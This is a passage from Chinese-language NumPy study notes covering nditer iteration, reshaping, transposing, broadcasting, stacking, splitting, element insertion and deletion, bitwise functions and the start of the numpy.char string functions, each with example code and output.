![image-20240420192437412](Python超详细的学习笔记（3.0）.assets/image-20240420192437412.png)

在下面的实例中，迭代器遍历对应于每列，并组合为一维数组。

```python
import numpy as np 
a = np.arange(0,60,5) 
a = a.reshape(3,4)  
print ('原始数组是：')
print (a)
print ('\n')
print ('修改后的数组是：')
for x in np.nditer(a, flags =  ['external_loop'], order =  'F'):  
   print (x, end=", " )
```

输出结果为：

```
原始数组是：
[[ 0  5 10 15]
 [20 25 30 35]
 [40 45 50 55]]


修改后的数组是：
[ 0 20 40], [ 5 25 45], [10 30 50], [15 35 55],
```

### 1-10-4 广播迭代

如果两个数组是可广播的，nditer 组合对象能够同时迭代它们。 假设数组 a 的维度为 3X4，数组 b 的维度为 1X4 ，则使用以下迭代器（数组 b 被广播到 a 的大小）。

```python
import numpy as np 
 
a = np.arange(0,60,5) 
a = a.reshape(3,4)  
print  ('第一个数组为：')
print (a)
print  ('\n')
print ('第二个数组为：')
b = np.array([1,  2,  3,  4], dtype =  int)  
print (b)
print ('\n')
print ('修改后的数组为：')
for x,y in np.nditer([a,b]):  
    print ("%d:%d"  %  (x,y), end=", " )
```

输出结果为：

```
第一个数组为：
[[ 0  5 10 15]
 [20 25 30 35]
 [40 45 50 55]]


第二个数组为：
[1 2 3 4]


修改后的数组为：
0:1, 5:2, 10:3, 15:4, 20:1, 25:2, 30:3, 35:4, 40:1, 45:2, 50:3, 55:4,
```

## 1-11 Numpy 数组操作

### 1-11-1 修改数组形状

![image-20240420192725293](Python超详细的学习笔记（3.0）.assets/image-20240420192725293.png)

#### 1-1 numpy.reshape

numpy.reshape 函数可以在不改变数据的条件下修改形状，格式如下：

```
numpy.reshape(arr, newshape, order='C')
```

- `arr`：要修改形状的数组
- `newshape`：整数或者整数数组，新的形状应当兼容原有形状
- order：'C' -- 按行，'F' -- 按列，'A' -- 原顺序，'k' -- 元素在内存中的出现顺序。

```python
import numpy as np
 
a = np.arange(8)
print ('原始数组：')
print (a)
print ('\n')
 
b = a.reshape(4,2)
print ('修改后的数组：')
print (b)
```

输出结果如下：

```
原始数组：
[0 1 2 3 4 5 6 7]

修改后的数组：
[[0 1]
 [2 3]
 [4 5]
 [6 7]]
```

#### 1-2 numpy.ndarray.flat

numpy.ndarray.flat 是一个数组元素迭代器，实例如下:

```python
import numpy as np
 
a = np.arange(9).reshape(3,3) 
print ('原始数组：')
for row in a:
    print (row)
 
#对数组中每个元素都进行处理，可以使用flat属性，该属性是一个数组元素迭代器：
print ('迭代后的数组：')
for element in a.flat:
    print (element)
```

输出结果如下：

```
原始数组：
[0 1 2]
[3 4 5]
[6 7 8]
迭代后的数组：
0
1
2
3
4
5
6
7
8
```

#### 1-3 numpy.ndarray.flatten

numpy.ndarray.flatten 返回一份数组拷贝，对拷贝所做的修改不会影响原始数组，格式如下：

```
ndarray.flatten(order='C')
```

参数说明：

- order：'C' -- 按行，'F' -- 按列，'A' -- 原顺序，'K' -- 元素在内存中的出现顺序。

```python
import numpy as np
 
a = np.arange(8).reshape(2,4)
 
print ('原数组：')
print (a)
print ('\n')
# 默认按行
 
print ('展开的数组：')
print (a.flatten())
print ('\n')
 
print ('以 F 风格顺序展开的数组：')
print (a.flatten(order = 'F'))
```

输出结果如下：

```
原数组：
[[0 1 2 3]
 [4 5 6 7]]


展开的数组：
[0 1 2 3 4 5 6 7]


以 F 风格顺序展开的数组：
[0 4 1 5 2 6 3 7]
```

#### 1-4 numpy.ravel

numpy.ravel() 展平的数组元素，顺序通常是"C风格"，返回的是数组视图（view，有点类似 C/C++引用reference的意味），修改会影响原始数组。

该函数接收两个参数：

```
numpy.ravel(a, order='C')
```

参数说明：

order：'C' -- 按行，'F' -- 按列，'A' -- 原顺序，'K' -- 元素在内存中的出现顺序

```python
import numpy as np
 
a = np.arange(8).reshape(2,4)
 
print ('原数组：')
print (a)
print ('\n')
 
print ('调用 ravel 函数之后：')
print (a.ravel())
print ('\n')
 
print ('以 F 风格顺序调用 ravel 函数之后：')
print (a.ravel(order = 'F'))
```

输出结果如下：

```
原数组：
[[0 1 2 3]
 [4 5 6 7]]


调用 ravel 函数之后：
[0 1 2 3 4 5 6 7]


以 F 风格顺序调用 ravel 函数之后：
[0 4 1 5 2 6 3 7]
```

------

### 1-11-2 翻转数组

![image-20240420193157032](Python超详细的学习笔记（3.0）.assets/image-20240420193157032.png)

#### 2-1 numpy.transpose

numpy.transpose 函数用于对换数组的维度，格式如下：

```
numpy.transpose(arr, axes)
```

参数说明:

`arr`：要操作的数组

`axes`：整数列表，对应维度，通常所有维度都会对换。

```python
import numpy as np
 
a = np.arange(12).reshape(3,4)
 
print ('原数组：')
print (a )
print ('\n')
 
print ('对换数组：')
print (np.transpose(a))
```

输出结果如下：

```
原数组：
[[ 0  1  2  3]
 [ 4  5  6  7]
 [ 8  9 10 11]]


对换数组：
[[ 0  4  8]
 [ 1  5  9]
 [ 2  6 10]
 [ 3  7 11]]
```

numpy.ndarray.T 类似 numpy.transpose：

```python
import numpy as np
 
a = np.arange(12).reshape(3,4)
 
print ('原数组：')
print (a)
print ('\n')
 
print ('转置数组：')
print (a.T)
```

输出结果如下：

```
原数组：
[[ 0  1  2  3]
 [ 4  5  6  7]
 [ 8  9 10 11]]


转置数组：
[[ 0  4  8]
 [ 1  5  9]
 [ 2  6 10]
 [ 3  7 11]]
```

#### 2-2 numpy.rollaxis

numpy.rollaxis 函数向后滚动特定的轴到一个特定位置，格式如下：

```
numpy.rollaxis(arr, axis, start)
```

参数说明：

- `arr`：数组
- `axis`：要向后滚动的轴，其它轴的相对位置不会改变
- `start`：默认为零，表示完整的滚动。会滚动到特定位置。

```python
import numpy as np
 
# 创建了三维的 ndarray
a = np.arange(8).reshape(2,2,2)
 
print ('原数组：')
print (a)
print ('获取数组中一个值：')
print(np.where(a==6))   
print(a[1,1,0])  # 为 6
print ('\n')
 
 
# 将轴 2 滚动到轴 0（宽度到深度）
 
print ('调用 rollaxis 函数：')
b = np.rollaxis(a,2,0)
print (b)
# 查看元素 a[1,1,0]，即 6 的坐标，变成 [0, 1, 1]
# 最后一个 0 移动到最前面
print(np.where(b==6))   
print ('\n')
 
# 将轴 2 滚动到轴 1：（宽度到高度）
 
print ('调用 rollaxis 函数：')
c = np.rollaxis(a,2,1)
print (c)
# 查看元素 a[1,1,0]，即 6 的坐标，变成 [1, 0, 1]
# 最后的 0 和 它前面的 1 对换位置
print(np.where(c==6))   
print ('\n')
```

输出结果如下：

```
原数组：
[[[0 1]
  [2 3]]

 [[4 5]
  [6 7]]]
获取数组中一个值：
(array([1]), array([1]), array([0]))
6


调用 rollaxis 函数：
[[[0 2]
  [4 6]]

 [[1 3]
  [5 7]]]
(array([0]), array([1]), array([1]))


调用 rollaxis 函数：
[[[0 2]
  [1 3]]

 [[4 6]
  [5 7]]]
(array([1]), array([0]), array([1]))
```

#### 2-3 numpy.swapaxes

numpy.swapaxes 函数用于交换数组的两个轴，格式如下：

```
numpy.swapaxes(arr, axis1, axis2)
```

- `arr`：输入的数组
- `axis1`：对应第一个轴的整数
- `axis2`：对应第二个轴的整数

```python
import numpy as np
 
# 创建了三维的 ndarray
a = np.arange(8).reshape(2,2,2)
 
print ('原数组：')
print (a)
print ('\n')
# 现在交换轴 0（深度方向）到轴 2（宽度方向）
 
print ('调用 swapaxes 函数后的数组：')
print (np.swapaxes(a, 2, 0))
```

输出结果如下：

```
原数组：
[[[0 1]
  [2 3]]

 [[4 5]
  [6 7]]]


调用 swapaxes 函数后的数组：
[[[0 4]
  [2 6]]

 [[1 5]
  [3 7]]]
```

------

### 1-11-3 修改数组维度

![image-20240420193617299](Python超详细的学习笔记（3.0）.assets/image-20240420193617299.png)

#### 3-1 numpy.broadcast

numpy.broadcast 用于模仿广播的对象，它返回一个对象，该对象封装了将一个数组广播到另一个数组的结果。

该函数使用两个数组作为输入参数，如下实例：

```python
import numpy as np
 
x = np.array([[1], [2], [3]])
y = np.array([4, 5, 6])  
 
# 对 y 广播 x
b = np.broadcast(x,y)  
# 它拥有 iterator 属性，基于自身组件的迭代器元组
 
print ('对 y 广播 x：')
r,c = b.iters
 
# Python3.x 为 next(context) ，Python2.x 为 context.next()
print (next(r), next(c))
print (next(r), next(c))
print ('\n')
# shape 属性返回广播对象的形状
 
print ('广播对象的形状：')
print (b.shape)
print ('\n')
# 手动使用 broadcast 将 x 与 y 相加
b = np.broadcast(x,y)
c = np.empty(b.shape)
 
print ('手动使用 broadcast 将 x 与 y 相加：')
print (c.shape)
print ('\n')
c.flat = [u + v for (u,v) in b]
 
print ('调用 flat 函数：')
print (c)
print ('\n')
# 获得了和 NumPy 内建的广播支持相同的结果
 
print ('x 与 y 的和：')
print (x + y)
```

输出结果为：

```
对 y 广播 x：
1 4
1 5


广播对象的形状：
(3, 3)


手动使用 broadcast 将 x 与 y 相加：
(3, 3)


调用 flat 函数：
[[5. 6. 7.]
 [6. 7. 8.]
 [7. 8. 9.]]


x 与 y 的和：
[[5 6 7]
 [6 7 8]
 [7 8 9]]
```

#### 3-2 numpy.broadcast_to 

函数将数组广播到新形状。它在原始数组上返回只读视图。 它通常不连续。 如果新形状不符合 NumPy 的广播规则，该函数可能会抛出ValueError。

```
numpy.broadcast_to(array, shape, subok)
```

```python
import numpy as np
 
a = np.arange(4).reshape(1,4)
 
print ('原数组：')
print (a)
print ('\n')
 
print ('调用 broadcast_to 函数之后：')
print (np.broadcast_to(a,(4,4)))
```

输出结果为：

```
原数组：
[[0 1 2 3]]


调用 broadcast_to 函数之后：
[[0 1 2 3]
 [0 1 2 3]
 [0 1 2 3]
 [0 1 2 3]]
```

#### 3-3 numpy.expand_dims

numpy.expand_dims 函数通过在指定位置插入新的轴来扩展数组形状，函数格式如下:

```
 numpy.expand_dims(arr, axis)
```

参数说明：

- `arr`：输入数组
- `axis`：新轴插入的位置

```python
import numpy as np
 
x = np.array(([1,2],[3,4]))
 
print ('数组 x：')
print (x)
print ('\n')
y = np.expand_dims(x, axis = 0)
 
print ('数组 y：')
print (y)
print ('\n')
 
print ('数组 x 和 y 的形状：')
print (x.shape, y.shape)
print ('\n')
# 在位置 1 插入轴
y = np.expand_dims(x, axis = 1)
 
print ('在位置 1 插入轴之后的数组 y：')
print (y)
print ('\n')
 
print ('x.ndim 和 y.ndim：')
print (x.ndim,y.ndim)
print ('\n')
 
print ('x.shape 和 y.shape：')
print (x.shape, y.shape)
```

输出结果为：

```
数组 x：
[[1 2]
 [3 4]]


数组 y：
[[[1 2]
  [3 4]]]


数组 x 和 y 的形状：
(2, 2) (1, 2, 2)


在位置 1 插入轴之后的数组 y：
[[[1 2]]

 [[3 4]]]


x.ndim 和 y.ndim：
2 3


x.shape 和 y.shape：
(2, 2) (2, 1, 2)
```

#### 3-4 numpy.squeeze

numpy.squeeze 函数从给定数组的形状中删除一维的条目，函数格式如下：

```
numpy.squeeze(arr, axis)
```

参数说明：

- `arr`：输入数组
- `axis`：整数或整数元组，用于选择形状中一维条目的子集

```python
import numpy as np
 
x = np.arange(9).reshape(1,3,3)
 
print ('数组 x：')
print (x)
print ('\n')
y = np.squeeze(x)
 
print ('数组 y：')
print (y)
print ('\n')
 
print ('数组 x 和 y 的形状：')
print (x.shape, y.shape)
```

输出结果为：

```
数组 x：
[[[0 1 2]
  [3 4 5]
  [6 7 8]]]


数组 y：
[[0 1 2]
 [3 4 5]
 [6 7 8]]


数组 x 和 y 的形状：
(1, 3, 3) (3, 3)
```

### 1-11-4 连接数组

![image-20240420193838297](Python超详细的学习笔记（3.0）.assets/image-20240420193838297.png)

#### 4-1 numpy.concatenate

numpy.concatenate 函数用于沿指定轴连接相同形状的两个或多个数组，格式如下：

```
numpy.concatenate((a1, a2, ...), axis)
```

参数说明：

- `a1, a2, ...`：相同类型的数组
- `axis`：沿着它连接数组的轴，默认为 0

```python
import numpy as np
 
a = np.array([[1,2],[3,4]])
 
print ('第一个数组：')
print (a)
print ('\n')
b = np.array([[5,6],[7,8]])
 
print ('第二个数组：')
print (b)
print ('\n')
# 两个数组的维度相同
 
print ('沿轴 0 连接两个数组：')
print (np.concatenate((a,b)))
print ('\n')
 
print ('沿轴 1 连接两个数组：')
print (np.concatenate((a,b),axis = 1))
```

输出结果为：

```
第一个数组：
[[1 2]
 [3 4]]


第二个数组：
[[5 6]
 [7 8]]


沿轴 0 连接两个数组：
[[1 2]
 [3 4]
 [5 6]
 [7 8]]


沿轴 1 连接两个数组：
[[1 2 5 6]
 [3 4 7 8]]
```

#### 4-2 numpy.stack

numpy.stack 函数用于沿新轴连接数组序列，格式如下：

```
numpy.stack(arrays, axis)
```

参数说明：

- `arrays`相同形状的数组序列
- `axis`：返回数组中的轴，输入数组沿着它来堆叠

```python
import numpy as np
 
a = np.array([[1,2],[3,4]])
 
print ('第一个数组：')
print (a)
print ('\n')
b = np.array([[5,6],[7,8]])
 
print ('第二个数组：')
print (b)
print ('\n')
 
print ('沿轴 0 堆叠两个数组：')
print (np.stack((a,b),0))
print ('\n')
 
print ('沿轴 1 堆叠两个数组：')
print (np.stack((a,b),1))
```

输出结果如下：

```
第一个数组：
[[1 2]
 [3 4]]


第二个数组：
[[5 6]
 [7 8]]


沿轴 0 堆叠两个数组：
[[[1 2]
  [3 4]]

 [[5 6]
  [7 8]]]


沿轴 1 堆叠两个数组：
[[[1 2]
  [5 6]]

 [[3 4]
  [7 8]]]
```

#### 4-3 numpy.hstack

numpy.hstack 是 numpy.stack 函数的变体，它通过水平堆叠来生成数组。

```python
import numpy as np
 
a = np.array([[1,2],[3,4]])
 
print ('第一个数组：')
print (a)
print ('\n')
b = np.array([[5,6],[7,8]])
 
print ('第二个数组：')
print (b)
print ('\n')
 
print ('水平堆叠：')
c = np.hstack((a,b))
print (c)
print ('\n')
```

输出结果如下：

```
第一个数组：
[[1 2]
 [3 4]]


第二个数组：
[[5 6]
 [7 8]]


水平堆叠：
[[1 2 5 6]
 [3 4 7 8]]
```

#### 4-4 numpy.vstack

numpy.vstack 是 numpy.stack 函数的变体，它通过垂直堆叠来生成数组。

```python
import numpy as np
 
a = np.array([[1,2],[3,4]])
 
print ('第一个数组：')
print (a)
print ('\n')
b = np.array([[5,6],[7,8]])
 
print ('第二个数组：')
print (b)
print ('\n')
 
print ('竖直堆叠：')
c = np.vstack((a,b))
print (c)
```

输出结果为：

```
第一个数组：
[[1 2]
 [3 4]]


第二个数组：
[[5 6]
 [7 8]]


竖直堆叠：
[[1 2]
 [3 4]
 [5 6]
 [7 8]]
```

------

### 1-11-5 分割数组

![image-20240420194103927](Python超详细的学习笔记（3.0）.assets/image-20240420194103927.png)

#### 5-1 numpy.split

numpy.split 函数沿特定的轴将数组分割为子数组，格式如下：

```
numpy.split(ary, indices_or_sections, axis)
```

参数说明：

- `ary`：被分割的数组
- `indices_or_sections`：如果是一个整数，就用该数平均切分，如果是一个数组，为沿轴切分的位置（左开右闭）
- `axis`：设置沿着哪个方向进行切分，默认为 0，横向切分，即水平方向。为 1 时，纵向切分，即竖直方向。

```python
import numpy as np
 
a = np.arange(9)
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('将数组分为三个大小相等的子数组：')
b = np.split(a,3)
print (b)
print ('\n')
 
print ('将数组在一维数组中表明的位置分割：')
b = np.split(a,[4,7])
print (b)
```

输出结果为：

```
第一个数组：
[0 1 2 3 4 5 6 7 8]


将数组分为三个大小相等的子数组：
[array([0, 1, 2]), array([3, 4, 5]), array([6, 7, 8])]


将数组在一维数组中表明的位置分割：
[array([0, 1, 2, 3]), array([4, 5, 6]), array([7, 8])]
```

axis 为 0 时在水平方向分割，axis 为 1 时在垂直方向分割：

```python
import numpy as np

a = np.arange(16).reshape(4, 4)
print('第一个数组：')
print(a)
print('\n')
print('默认分割（0轴）：')
b = np.split(a,2)
print(b)
print('\n')

print('沿水平方向分割：')
c = np.split(a,2,1)
print(c)
print('\n')

print('沿水平方向分割：')
d= np.hsplit(a,2)
print(d)
```

输出结果为：

```
第一个数组：
[[ 0  1  2  3]
 [ 4  5  6  7]
 [ 8  9 10 11]
 [12 13 14 15]]


默认分割（0轴）：
[array([[0, 1, 2, 3],
       [4, 5, 6, 7]]), array([[ 8,  9, 10, 11],
       [12, 13, 14, 15]])]


沿水平方向分割：
[array([[ 0,  1],
       [ 4,  5],
       [ 8,  9],
       [12, 13]]), array([[ 2,  3],
       [ 6,  7],
       [10, 11],
       [14, 15]])]


沿水平方向分割：
[array([[ 0,  1],
       [ 4,  5],
       [ 8,  9],
       [12, 13]]), array([[ 2,  3],
       [ 6,  7],
       [10, 11],
       [14, 15]])]
```

#### 5-2 numpy.hsplit

numpy.hsplit 函数用于水平分割数组，通过指定要返回的相同形状的数组数量来拆分原数组。

```python
import numpy as np
 
harr = np.floor(10 * np.random.random((2, 6)))
print ('原array：')
print(harr)
 
print ('拆分后：')
print(np.hsplit(harr, 3))
```

输出结果为：

```
原array：
[[4. 7. 6. 3. 2. 6.]
 [6. 3. 6. 7. 9. 7.]]
拆分后：
[array([[4., 7.],
       [6., 3.]]), array([[6., 3.],
       [6., 7.]]), array([[2., 6.],
       [9., 7.]])]
```

#### 5-3 numpy.vsplit

numpy.vsplit 沿着垂直轴分割，其分割方式与hsplit用法相同。

```python
import numpy as np
 
a = np.arange(16).reshape(4,4)
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('竖直分割：')
b = np.vsplit(a,2)
print (b)
```

输出结果为：

```
第一个数组：
[[ 0  1  2  3]
 [ 4  5  6  7]
 [ 8  9 10 11]
 [12 13 14 15]]


竖直分割：
[array([[0, 1, 2, 3],
       [4, 5, 6, 7]]), array([[ 8,  9, 10, 11],
       [12, 13, 14, 15]])]
```

------

### 1-11-6 数组元素的添加与删除

![image-20240420194318399](Python超详细的学习笔记（3.0）.assets/image-20240420194318399.png)

#### 6-1 numpy.resize

numpy.resize 函数返回指定大小的新数组。

如果新数组大小大于原始大小，则包含原始数组中的元素的副本。

```
numpy.resize(arr, shape)
```

参数说明：

- `arr`：要修改大小的数组
- `shape`：返回数组的新形状

```Python
import numpy as np
 
a = np.array([[1,2,3],[4,5,6]])
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('第一个数组的形状：')
print (a.shape)
print ('\n')
b = np.resize(a, (3,2))
 
print ('第二个数组：')
print (b)
print ('\n')
 
print ('第二个数组的形状：')
print (b.shape)
print ('\n')
# 要注意 a 的第一行在 b 中重复出现，因为尺寸变大了
 
print ('修改第二个数组的大小：')
b = np.resize(a,(3,3))
print (b)
```

输出结果为：

```
第一个数组：
[[1 2 3]
 [4 5 6]]


第一个数组的形状：
(2, 3)


第二个数组：
[[1 2]
 [3 4]
 [5 6]]


第二个数组的形状：
(3, 2)


修改第二个数组的大小：
[[1 2 3]
 [4 5 6]
 [1 2 3]]
```

#### 6-2 numpy.append

numpy.append 函数在数组的末尾添加值。 追加操作会分配整个数组，并把原来的数组复制到新数组中。 此外，输入数组的维度必须匹配否则将生成ValueError。

append 函数返回的始终是一个一维数组。

```
numpy.append(arr, values, axis=None)
```

参数说明：

- `arr`：输入数组
- `values`：要向`arr`添加的值，需要和`arr`形状相同（除了要添加的轴）
- `axis`：默认为 None。当axis无定义时，是横向加成，返回总是为一维数组！当axis有定义的时候，分别为0和1的时候。当axis有定义的时候，分别为0和1的时候（列数要相同）。当axis为1时，数组是加在右边（行数要相同）。

```python
import numpy as np
 
a = np.array([[1,2,3],[4,5,6]])
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('向数组添加元素：')
print (np.append(a, [7,8,9]))
print ('\n')
 
print ('沿轴 0 添加元素：')
print (np.append(a, [[7,8,9]],axis = 0))
print ('\n')
 
print ('沿轴 1 添加元素：')
print (np.append(a, [[5,5,5],[7,8,9]],axis = 1))
```

输出结果为：

```
第一个数组：
[[1 2 3]
 [4 5 6]]


向数组添加元素：
[1 2 3 4 5 6 7 8 9]


沿轴 0 添加元素：
[[1 2 3]
 [4 5 6]
 [7 8 9]]


沿轴 1 添加元素：
[[1 2 3 5 5 5]
 [4 5 6 7 8 9]]
```

#### 6-3 numpy.insert

numpy.insert 函数在给定索引之前，沿给定轴在输入数组中插入值。

如果值的类型转换为要插入，则它与输入数组不同。 插入没有原地的，函数会返回一个新数组。 此外，如果未提供轴，则输入数组会被展开。

```
numpy.insert(arr, obj, values, axis)
```

参数说明：

- `arr`：输入数组
- `obj`：在其之前插入值的索引
- `values`：要插入的值
- `axis`：沿着它插入的轴，如果未提供，则输入数组会被展开

```python
import numpy as np
 
a = np.array([[1,2],[3,4],[5,6]])
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('未传递 Axis 参数。 在删除之前输入数组会被展开。')
print (np.insert(a,3,[11,12]))
print ('\n')
print ('传递了 Axis 参数。 会广播值数组来配输入数组。')
 
print ('沿轴 0 广播：')
print (np.insert(a,1,[11],axis = 0))
print ('\n')
 
print ('沿轴 1 广播：')
print (np.insert(a,1,11,axis = 1))
```

输出结果如下：

```
第一个数组：
[[1 2]
 [3 4]
 [5 6]]


未传递 Axis 参数。 在删除之前输入数组会被展开。
[ 1  2  3 11 12  4  5  6]


传递了 Axis 参数。 会广播值数组来配输入数组。
沿轴 0 广播：
[[ 1  2]
 [11 11]
 [ 3  4]
 [ 5  6]]


沿轴 1 广播：
[[ 1 11  2]
 [ 3 11  4]
 [ 5 11  6]]
```

#### 6-4 numpy.delete

numpy.delete 函数返回从输入数组中删除指定子数组的新数组。 与 insert() 函数的情况一样，如果未提供轴参数，则输入数组将展开。

```
Numpy.delete(arr, obj, axis)
```

参数说明：

- `arr`：输入数组
- `obj`：可以被切片，整数或者整数数组，表明要从输入数组删除的子数组
- `axis`：沿着它删除给定子数组的轴，如果未提供，则输入数组会被展开

```python
import numpy as np
 
a = np.arange(12).reshape(3,4)
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('未传递 Axis 参数。 在插入之前输入数组会被展开。')
print (np.delete(a,5))
print ('\n')
 
print ('删除第二列：')
print (np.delete(a,1,axis = 1))
print ('\n')
 
print ('包含从数组中删除的替代值的切片：')
a = np.array([1,2,3,4,5,6,7,8,9,10])
print (np.delete(a, np.s_[::2]))
```

输出结果为：

```
第一个数组：
[[ 0  1  2  3]
 [ 4  5  6  7]
 [ 8  9 10 11]]


未传递 Axis 参数。 在插入之前输入数组会被展开。
[ 0  1  2  3  4  6  7  8  9 10 11]


删除第二列：
[[ 0  2  3]
 [ 4  6  7]
 [ 8 10 11]]


包含从数组中删除的替代值的切片：
[ 2  4  6  8 10]
```

#### 6-6 numpy.unique

numpy.unique 函数用于去除数组中的重复元素。

```
numpy.unique(arr, return_index, return_inverse, return_counts)
```

`arr`：输入数组，如果不是一维数组则会展开

- `return_index`：如果为`true`，返回新列表元素在旧列表中的位置（下标），并以列表形式储
- `return_inverse`：如果为`true`，返回旧列表元素在新列表中的位置（下标），并以列表形式储
- `return_counts`：如果为`true`，返回去重数组中的元素在原数组中的出现次数

```python
import numpy as np
 
a = np.array([5,2,6,2,7,5,6,8,2,9])
 
print ('第一个数组：')
print (a)
print ('\n')
 
print ('第一个数组的去重值：')
u = np.unique(a)
print (u)
print ('\n')
 
print ('去重数组的索引数组：')
u,indices = np.unique(a, return_index = True)
print (indices)
print ('\n')
 
print ('我们可以看到每个和原数组下标对应的数值：')
print (a)
print ('\n')
 
print ('去重数组的下标：')
u,indices = np.unique(a,return_inverse = True)
print (u)
print ('\n')
 
print ('下标为：')
print (indices)
print ('\n')
 
print ('使用下标重构原数组：')
print (u[indices])
print ('\n')
 
print ('返回去重元素的重复数量：')
u,indices = np.unique(a,return_counts = True)
print (u)
print (indices)
```

输出结果为：

```
第一个数组：
[5 2 6 2 7 5 6 8 2 9]


第一个数组的去重值：
[2 5 6 7 8 9]


去重数组的索引数组：
[1 0 2 4 7 9]


我们可以看到每个和原数组下标对应的数值：
[5 2 6 2 7 5 6 8 2 9]


去重数组的下标：
[2 5 6 7 8 9]


下标为：
[1 0 2 0 3 1 2 4 0 5]


使用下标重构原数组：
[5 2 6 2 7 5 6 8 2 9]


返回去重元素的重复数量：
[2 5 6 7 8 9]
[3 2 2 1 1 1]
```

## 1-12 NumPy 位运算

- 位运算是一种在二进制数字的位级别上进行操作的一类运算，它们直接操作二进制数字的各个位，而不考虑数字的整体值。
- 位运算在计算机科学中广泛应用于优化和处理底层数据。
- NumPy **"bitwise_"** 开头的函数是位运算函数。

NumPy 位运算包括以下几个函数：

![image-20240420195020950](Python超详细的学习笔记（3.0）.assets/image-20240420195020950.png)

```python
import numpy as np

arr1 = np.array([True, False, True], dtype=bool)
arr2 = np.array([False, True, False], dtype=bool)

result_and = np.bitwise_and(arr1, arr2)
result_or = np.bitwise_or(arr1, arr2)
result_xor = np.bitwise_xor(arr1, arr2)
result_not = np.bitwise_not(arr1)

print("AND:", result_and)  # [False, False, False]
print("OR:", result_or)    # [True, True, True]
print("XOR:", result_xor)  # [True, True, True]
print("NOT:", result_not)  # [False, True, False]

# 按位取反
arr_invert = np.invert(np.array([1, 2], dtype=np.int8))
print("Invert:", arr_invert)  # [-2, -3]

# 左移位运算
arr_left_shift = np.left_shift(5, 2)
print("Left Shift:", arr_left_shift)  # 20

# 右移位运算
arr_right_shift = np.right_shift(10, 1)
print("Right Shift:", arr_right_shift)  # 5
```

也可以使用 **"&"、 "~"、 "|" 和 "^"** 等操作符进行计算：

1. **与运算（&）：** 对应位上的两个数字都为1时，结果为1；否则，结果为0。

   例如：1010 & 1100 = 1000

2. **或运算（|）：** 对应位上的两个数字有一个为1时，结果为1；否则，结果为0。

   例如：1010 | 1100 = 1110

3. **异或运算（^）：** 对应位上的两个数字相异时，结果为1；相同时，结果为0。

   例如：1010 ^ 1100 = 0110

4. **取反运算（~）：** 对数字的每个位取反，即0变为1，1变为0。

   例如：~1010 = 0101

5. **左移运算（<<）：** 将数字的所有位向左移动指定的位数，右侧用0填充。

   例如：1010 << 2 = 101000

6. **右移运算（>>）：** 将数字的所有位向右移动指定的位数，左侧根据符号位或补零。

   例如：1010 >> 2 = 0010

### 1-12-1 bitwise_and

bitwise_and() 函数对数组中整数的二进制形式执行位与运算。

```python
import numpy as np 
 
print ('13 和 17 的二进制形式：')
a,b = 13,17
print (bin(a), bin(b))
print ('\n')
 
print ('13 和 17 的位与：')
print (np.bitwise_and(13, 17))
```

输出结果为：

```
13 和 17 的二进制形式：
0b1101 0b10001


13 和 17 的位与：
1
```

以上实例可以用下表来说明：‘

![image-20240420195130690](Python超详细的学习笔记（3.0）.assets/image-20240420195130690.png)

### 1-12-2 bitwise_or

bitwise_or()函数对数组中整数的二进制形式执行位或运算。

```python
import numpy as np 
 
a,b = 13,17 
print ('13 和 17 的二进制形式：')
print (bin(a), bin(b))
 
print ('13 和 17 的位或：')
print (np.bitwise_or(13, 17))
```

输出结果为：

```
13 和 17 的二进制形式：
0b1101 0b10001
13 和 17 的位或：
29
```

以上实例可以用下表来说明：

![image-20240420195217375](Python超详细的学习笔记（3.0）.assets/image-20240420195217375.png)

### 1-12-3 invert

invert() 函数对数组中整数进行位取反运算，即 0 变成 1，1 变成 0。

对于有符号整数，取该二进制数的补码，然后 +1。二进制数，最高位为0表示正数，最高位为 1 表示负数。

看看 ~1 的计算步骤：

- 将**`1`**(这里叫：原码)转二进制 ＝ **`00000001`**
- 按位取反 ＝ **`11111110`**
- 发现符号位(即最高位)为**`1`**(表示负数)，将除符号位之外的其他数字取反 ＝ **`10000001`**
- 末位加1取其补码 ＝ **`10000010`**
- 转换回十进制 ＝ **`-2`**

![image-20240420195240947](Python超详细的学习笔记（3.0）.assets/image-20240420195240947.png)

```python
import numpy as np 
 
print ('13 的位反转，其中 ndarray 的 dtype 是 uint8：')
print (np.invert(np.array([13], dtype = np.uint8)))
print ('\n')
# 比较 13 和 242 的二进制表示，我们发现了位的反转
 
print ('13 的二进制表示：')
print (np.binary_repr(13, width = 8))
print ('\n')
 
print ('242 的二进制表示：')
print (np.binary_repr(242, width = 8))
```

输出结果为：

```
13 的位反转，其中 ndarray 的 dtype 是 uint8：
[242]


13 的二进制表示：
00001101


242 的二进制表示：
11110010
```

### 1-12-4 left_shift

left_shift() 函数将数组元素的二进制形式向左移动到指定位置，右侧附加相等数量的 0。

```python
import numpy as np 
 
print ('将 10 左移两位：')
print (np.left_shift(10,2))
print ('\n')
 
print ('10 的二进制表示：')
print (np.binary_repr(10, width = 8))
print ('\n')
 
print ('40 的二进制表示：')
print (np.binary_repr(40, width = 8))
#  '00001010' 中的两位移动到了左边，并在右边添加了两个 0。
```

输出结果为：

```
将 10 左移两位：
40


10 的二进制表示：
00001010


40 的二进制表示：
00101000
```

### 1-12-5 right_shift

right_shift() 函数将数组元素的二进制形式向右移动到指定位置，左侧附加相等数量的 0。

```python
import numpy as np 
 
print ('将 40 右移两位：')
print (np.right_shift(40,2))
print ('\n')
 
print ('40 的二进制表示：')
print (np.binary_repr(40, width = 8))
print ('\n')
 
print ('10 的二进制表示：')
print (np.binary_repr(10, width = 8))
#  '00001010' 中的两位移动到了右边，并在左边添加了两个 0。
```

输出结果为：

```
将 40 右移两位：
10


40 的二进制表示：
00101000


10 的二进制表示：
00001010
```

## 1-13 NumPy 字符串函数

以下函数用于对 dtype 为 numpy.string_ 或 numpy.unicode_ 的数组执行向量化字符串操作。 它们基于 Python 内置库中的标准字符串函数。

这些函数在字符数组类（numpy.char）中定义。

![image-20240420195436983](Python超详细的学习笔记（3.0）.assets/image-20240420195436983.png)

### 1-13-1 numpy.char.add()

numpy.char.add() 函数依次对两个数组的元素进行字符串连接。

```python
import numpy as np 
 
print ('连接两个字符串：')
print (np.char.add(['hello'],[' xyz']))
print ('\n')
 
print ('连接示例：')
print (np.char.add(['hello', 'hi'],[' abc', ' xyz']))
```

输出结果为：

```
连接两个字符串：
